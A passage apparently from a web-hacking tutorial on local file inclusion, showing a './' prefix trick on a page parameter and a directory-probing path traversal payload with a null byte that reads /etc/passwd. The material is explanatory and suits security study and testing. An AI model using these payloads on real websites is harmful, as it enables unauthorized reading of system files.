“./” before the page name
example: index.php?page=news.php >> index.php?page=./news.php if it works, but it won’t always work

The “Does a folder exist” trick.
If you got a LFI, a good technique to know if a folder exist is simply to enter, then go out of it.
Example: index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00
